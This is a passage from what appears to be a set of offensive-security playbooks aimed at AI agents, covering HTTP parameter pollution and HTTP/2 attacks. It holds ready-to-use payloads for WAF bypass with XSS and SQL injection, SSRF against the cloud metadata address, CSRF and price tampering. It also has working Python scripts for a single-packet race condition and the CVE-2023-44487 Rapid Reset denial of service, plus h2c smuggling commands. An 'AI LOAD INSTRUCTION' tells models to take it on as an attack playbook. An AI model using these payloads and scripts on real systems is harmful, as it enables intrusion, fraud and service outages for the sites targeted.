| **ASP.NET / IIS** | First and last comma-joined | `Request.QueryString["param"] == "value1,value2"` |
| **JSP / Java Servlet** | First value wins | `request.getParameter("param") == "value1"` |
| **Python (Flask/Django)** | Last value wins | `request.args.get("param") == "value2"` |
| **Node.js (Express/qs)** | Last value wins (default) | `req.query.param == "value2"` |
| **Node.js (qs)** | Array if repeated | `req.query.param == ["value1","value2"]` |
| **Go (net/http)** | First value wins | `r.URL.Query().Get("param") == "value1"` |
| **Ruby (Rails)** | Last value wins | `params[:param] == "value2"` |
| **Nginx** | Passes all to backend | Backend decides |
| **mod_wsgi (Apache)** | Last value wins | Standard WSGI behavior |
| **Tomcat** | First value wins | Standard Java servlet |

**Key insight**: If the WAF uses a different framework/language than the backend, they may use different values from the same duplicated parameter.

---

## 2. WAF BYPASS VIA HPP

If a WAF checks the first occurrence and the backend uses the last (or vice versa):

```
# WAF sees: param=safe_value → passes
# Backend uses: param=<script>alert(1)</script> → XSS executes
GET /search?q=hello&q=<script>alert(1)</script>

# More subtle:
GET /transfer?amount=1&amount=1000
# Backend processes: amount=1000 (last value PHP/Rails/Flask)
# WAF validated: amount=1 (first value)
```

### Real-World WAF Bypass Pattern

```http
# WAF checks first param, backend uses last:
POST /api/login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=safe_input&password=' OR '1'='1
```

---

## 3. SSRF VIA HPP (URL SPLITTING)

When a URL is constructed from multiple parameters:

```
App constructs: https://{host}{path}
Request: host=internal&path=.attacker.com
Result: https://internal.attacker.com ← bypasses internal SSRF filter
```

Or with duplicate URL parameters:

```
# Target validates: url=https://allowed.com
# Backend uses last: url=https://evil.com

GET /fetch?url=https://allowed.com&url=https://internal.company.com/admin
```

### SSRF via HPP in Webhook/Redirect Parameters

```
POST /webhook HTTP/1.1
Content-Type: application/x-www-form-urlencoded

callback_url=https://allowed.example.com&callback_url=https://169.254.169.254/latest/meta-data/
```

---

## 4. CSRF TOKEN CONFUSION VIA HPP

```
# Normal request:
POST /transfer?csrf_token=VALID_TOKEN

# HPP attack: inject second csrf_token
POST /transfer HTTP/1.1
Content-Type: application/x-www-form-urlencoded

amount=1000&to=attacker&csrf_token=INVALID&csrf_token=VALID_TOKEN
```

If the CSRF validator uses the first occurrence but the app uses the last:
- Validator: `csrf_token=INVALID` → validation fails (expected bypass)
- **OR** Validator: `csrf_token=VALID_TOKEN` (second) → valid, app processes with INVALID first value → confused state

---

## 5. BUSINESS LOGIC ABUSE — PAYMENT AMOUNT

Classic HPP payment confusion:

```
# Normal purchase: price=100.00
POST /checkout HTTP/1.1

price=100.00&price=1.00
# PHP backend might use first: price=100.00 (validation passes)
# Or last: price=1.00 (payment processed for $1.00)
```

```
# Coupon bypass: apply discount twice
POST /apply-coupon
coupon=DISCOUNT10&coupon=DISCOUNT10
# If coupon is applied for each occurrence: 20% discount
```

---

## 6. BACKEND/FRONTEND PARAMETER DISCREPANCY

When frontend JS sends one parameter set and backend expects another:

```javascript
// Frontend sends:
fetch('/api/update', {
  method: 'POST',
  body: new URLSearchParams({role: 'user', role: 'admin'})
  // URLSearchParams: last value wins in construction
  // But send to server: role=user&role=admin
})

// Backend (PHP) sees: role=admin (last value)
// Frontend only showed 'user' to the developer
```

---

## 7. ARRAY INJECTION VIA HPP

Some frameworks (PHP, Perl, Rails) treat bracket notation as arrays:

```
?id[]=1&id[]=2 → $_GET['id'] = [1, 2]
?id=1&id=2     → $_GET['id'] = "2" (last value)
```

This enables NoSQL operator injection (see nosql-injection skill) in Node.js applications using `qs` library:
```
?password[$ne]=invalid → {password: {$ne: "invalid"}}
```

---

## 8. TESTING METHODOLOGY

### Manual Probe

```bash
# Send duplicate parameters and compare response:
# Original: 
curl "https://target.com/search?q=test"

# HPP:
curl "https://target.com/search?q=test&q=test2"

# Check if response differs from q=test vs q=test2 → reveals which value backend uses
```

### Burp Intruder HPP Test

```
1. Send request to Repeater
2. Duplicate each parameter (add &param2=FUZZ before/after original param)
3. Test with payloads in the second occurrence
4. Compare responses to understand which value backend uses
```

### HPP on JSON Bodies

```json
// Some JSON parsers handle duplicate keys differently:
{"param": "value1", "param": "value2"}
// JavaScript (JSON.parse): last value wins → "value2"
// Some custom parsers: first value wins → "value1"
// Attackers can exploit this discrepancy
```

---

## 9. HPP IN HEADERS

Headers can also be duplicated:

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: attacker.com

# Some proxies combine: X-Forwarded-For: 127.0.0.1, attacker.com
# Others use last: X-Forwarded-For: attacker.com
# If IP whitelist checks first value and log uses combined → bypass
```

---

## 10. TESTING CHECKLIST

```
□ Identify key parameters: auth tokens, prices, IDs, URLs, roles
□ Duplicate each parameter with safe first / malicious second value
□ Duplicate each parameter with malicious first / safe second value
□ Test bracket notation: param[]=val1&param[]=val2 (PHP array injection)
□ Test HPP on CSRF tokens
□ Test HPP on payment/price fields  
□ Test HPP on role/permission fields
□ Test HPP on URL parameters used for fetching/redirecting
□ Check if WAF and backend handle duplicates differently (key bypass technique)
□ Test JSON bodies for duplicate key behavior
```



---

## http2-specific-attacks

# SKILL: HTTP/2 Specific Attacks — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: HTTP/2 introduces unique attack surfaces beyond HTTP/1.1 request smuggling. Covers h2c cleartext smuggling to bypass proxy ACLs, pseudo-header injection, HPACK compression side-channels, single-packet race conditions via stream multiplexing, and the Rapid Reset DoS CVE. Base models often conflate H2 smuggling with H1 smuggling or miss the h2csmuggler tool entirely.

## 0. RELATED ROUTING

- request-smuggling — HTTP/1.1 CL.TE / TE.CL smuggling
- race-condition — single-packet H2 race is a specialized race condition technique
- 401-403-bypass-techniques — h2c smuggling to bypass proxy-level ACLs

---

## 1. H2C SMUGGLING (HTTP/2 CLEARTEXT UPGRADE)

### Concept

When a reverse proxy (Nginx, HAProxy, AWS ALB) forwards HTTP/1.1 requests to a backend that supports `h2c` (HTTP/2 over cleartext), the proxy's access controls only apply to the outer HTTP/1.1 request. The inner HTTP/2 stream can reach internal paths that the proxy would normally block.

### How It Works

```
Client → HTTP/1.1 Upgrade: h2c → Proxy → HTTP/2 stream → Backend
         [Proxy forwards upgrade]        [Backend routes HTTP/2 stream]
         [Proxy only sees: GET /]        [Backend executes: GET /admin]
```

The proxy forwards the connection upgrade without checking the inner H2 stream destinations.

### h2csmuggler Tool

```bash
# Install:
pip3 install h2csmuggler
# or: git clone https://github.com/assetnote/h2csmuggler

# Check if target supports h2c upgrade:
h2csmuggler check https://target.com

# Access restricted path via h2c smuggling:
h2csmuggler --wordlist /dev/null -x https://target.com/admin
h2csmuggler -d "data=value" -X POST -H "Content-Type: application/json" \
            -x https://target.com/admin-api/users

# Scan for accessible paths:
h2csmuggler --wordlist paths.txt -x https://target.com
```

### Manual h2c Upgrade Request

```http
GET / HTTP/1.1
Host: target.com
Connection: Upgrade, HTTP2-Settings
Upgrade: h2c
HTTP2-Settings: AAMAAABkAAQAAP__

```

If the backend responds with `101 Switching Protocols`, h2c is supported and smuggling is possible.

---

## 2. HTTP/2 PSEUDO-HEADER INJECTION

HTTP/2 uses pseudo-headers instead of the HTTP/1.1 request line:
- `:method` — HTTP method (GET, POST, etc.)
- `:path` — URL path
- `:scheme` — http/https
- `:authority` — Host header equivalent

### Pseudo-Header Injection Attacks

**Injecting newlines into pseudo-headers** (H2→H1 downgrade poisoning):

```
:method: GET
:path: /path\r\nX-Injected: header\r\n\r\n
:authority: target.com
```

If the H2→H1 layer doesn't sanitize pseudo-headers before rewriting to HTTP/1.1, the newlines create a secondary request or poison headers.

**Method injection:**
```
:method: GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\nGET
```

**Path injection for cache poisoning:**
```
:path: /path?param=value#fragment
# Fragment may be passed to backend unexpectedly
```

### H2→H1 Downgrade Header Injection

When proxy downgrades H2 to H1:
```
# Inject H1-style headers via H2 header with same name as H1 special header:
:method: GET
:path: /
:authority: target.com
Transfer-Encoding: chunked  # Ambiguous — creates CL/TE confusion downstream

# Or inject via pseudo-header:
:path: /?param=%0d%0aX-Forwarded-For: 127.0.0.1
```

---

## 3. HPACK HEADER COMPRESSION ATTACKS

HPACK compresses HTTP/2 headers using a static table and dynamic table. Side-channel attacks observe response size/timing to infer secret header values.

### BREACH-like Attack on H2

If a secret is reflected in compressed HTTP/2 response headers:

```python
# Attack: inject user-controlled string alongside secret in compressed header
# If injected prefix matches secret prefix → better compression → smaller response

import requests

secret_len = 0
for length in range(1, 100):
    r = requests.get(f'https://target.com/?inject={"A" * length}')
    # Measure compressed response header size
    # If size decreases at some point → compression oracle
```

### CRIME Attack (Legacy)

CRIME exploited TLS compression of HTTP headers:
- Inject guesses into compressed TLS stream
- Observe response size change
- Cookie characters that match are compressed away → smaller response

**Mitigated**: TLS 1.3 and all modern browsers disable TLS compression. Relevant for legacy/custom implementations.

---

## 4. SINGLE-PACKET RACE CONDITION VIA H2 MULTIPLEXING

HTTP/2 multiplexing allows multiple concurrent streams in a single TCP connection. By sending multiple requests in one TCP packet, all arrive at the server simultaneously, enabling race conditions with zero network jitter.

### Concept

```
Stream 1: POST /redeem-voucher ─┐
Stream 2: POST /redeem-voucher ─┼── All in one TCP packet ──→ Server receives all simultaneously
Stream 3: POST /redeem-voucher ─┘
```

This eliminates the network timing variance that makes HTTP/1.1 race conditions difficult, achieving true simultaneous arrival.

### Burp Suite Single-Packet Attack

```
1. Send request to Repeater
2. Duplicate request 20 times (Ctrl+R)
3. Group all into a tab group
4. Send group with "Send group in parallel (single-packet attack)"
5. All requests arrive in single TCP packet → true race condition
```

### Python Implementation (using h2 library)

```python
from h2.connection import H2Connection
from h2.config import H2Configuration
import socket, ssl

# Connect with TLS
sock = socket.create_connection(('target.com', 443))
ctx = ssl.create_default_context()
ctx.set_alpn_protocols(['h2'])
ssl_sock = ctx.wrap_socket(sock, server_hostname='target.com')

# Create H2 connection
config = H2Configuration(client_side=True)
conn = H2Connection(config=config)
conn.initiate_connection()
ssl_sock.send(conn.data_to_send())

# Queue multiple requests in one send
for i in range(20):
    headers = [
        (':method', 'POST'),
        (':path', '/redeem-voucher'),
        (':authority', 'target.com'),
        (':scheme', 'https'),
        ('content-type', 'application/json'),
    ]
    body = b'{"voucher_code": "DISCOUNT50"}'
    conn.send_headers(stream_id=i*2+1, headers=headers)
    conn.send_data(stream_id=i*2+1, data=body, end_stream=True)

# Send all in one burst
ssl_sock.send(conn.data_to_send())
```

---

## 5. RST_STREAM FLOOD (CVE-2023-44487 — HTTP/2 RAPID RESET)

### Vulnerability

Attackers send multiple HEADERS frames immediately followed by RST_STREAM frames. This creates work for the server (processing the initial request) but the RST cancels before the server sends a response. 

By flooding thousands of such reset-cancel cycles:
- Server expends significant CPU on request processing
- Attacker uses minimal bandwidth
- Traditional rate limiting (which tracks active streams) is bypassed because streams are immediately cancelled

### Impact

- CVSS 7.5 — Denial of Service
- Exploited in record-breaking DDoS attacks (>398 million requests/second, August 2023)
- Affected: Nginx, Apache httpd, AWS ALB, Google Cloud, Cloudflare

### Detection / Testing (authorized only)

```python
import h2.connection, h2.config, ssl, socket

sock = socket.create_connection(('target.com', 443))
ctx = ssl.create_default_context()
ctx.set_alpn_protocols(['h2'])
ssl_sock = ctx.wrap_socket(sock, server_hostname='target.com')

config = h2.config.H2Configuration(client_side=True)
conn = h2.connection.H2Connection(config=config)
conn.initiate_connection()
ssl_sock.send(conn.data_to_send())

for i in range(100):
    stream_id = i * 2 + 1
    headers = [(':method','GET'),(':path','/'),(':authority','target.com'),(':scheme','https')]
    conn.send_headers(stream_id=stream_id, headers=headers, end_stream=True)
    conn.reset_stream(stream_id=stream_id)  # Immediate RST
    
ssl_sock.send(conn.data_to_send())
```

**Note**: This is a DoS technique. Use only on authorized targets in controlled testing.

---

## 6. HTTP/2 TO HTTP/1.1 DOWNGRADE INJECTION

Proxies that accept H2 from clients but speak H1 to backends create translation points where injection may occur.

### Transfer-Encoding Injection via H2 Headers

H2 is length-delimited (no Transfer-Encoding needed). But if the proxy forwards `Transfer-Encoding: chunked` header to the H1 backend:

```
H2 request with header: transfer-encoding: chunked
↓ Proxy downgrades to H1
↓ Forwards: Transfer-Encoding: chunked
→ Backend processes chunked body → potential H1 smuggling
```

### Content-Length Confusion

```
H2 request:
:method: POST
:path: /
content-length: 0
(actual body: 100 bytes)

→ Proxy might forward CL:0 to H1 backend while body still arrives → desync
```

---

## 7. TESTING CHECKLIST

```
□ Check if target supports h2c upgrade (101 response to Upgrade: h2c)
□ Run h2csmuggler to enumerate accessible paths via h2c
□ Probe pseudo-headers for injection (newlines, special characters)
□ Check if proxy performs H2→H1 downgrade and passes through H2-specific headers
□ Identify race-condition-vulnerable endpoints → test with single-packet attack via Burp
□ Check server version for CVE-2023-44487 (Rapid Reset) — Nginx < 1.25.3, etc.
□ Test HPACK side-channel if secret data is reflected in compressed H2 headers
□ Check server's concurrent stream limit (settings frame SETTINGS_MAX_CONCURRENT_STREAMS)
```

---

## 8. TOOLS SUMMARY

| Tool | Purpose |
|---|---|
| h2csmuggler | H2C upgrade detection and path smuggling |
| Burp Suite Professional | H2 single-packet race, H2 smuggling (Pro required for H2) |
| nghttp2 / h2c | Manual HTTP/2 client |
| `python -m h2` | H2 library for custom attacks |
| Wireshark with h2 dissector | Protocol-level debugging |
| nuclei | CVE-2023-44487 detection templates |

